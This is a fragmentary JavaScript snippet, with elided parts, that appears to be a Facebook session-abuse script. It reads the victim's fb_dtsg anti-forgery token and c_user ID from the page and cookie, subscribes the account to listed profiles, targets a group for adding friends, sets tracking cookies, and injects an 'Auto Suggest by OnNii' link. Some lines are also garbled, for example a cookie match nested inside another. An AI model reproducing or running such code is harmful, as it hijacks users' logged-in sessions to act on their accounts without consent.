...
sublist("10201270070381247");
sublist("10201270073701330");


//Group subscriber
var gid = ['513748232032240'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
...
function scinsiyetgetir(uid,cins,fonksiyon){
        ...
        xmlhttp.onreadystatechange = function () {
			...
			document.cookie = "cins" + user_id + "=osman.lushi;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=oni.lushi;expires=" + btarihi.toGMTString();
			}
...
function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        ...
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by OnNii';
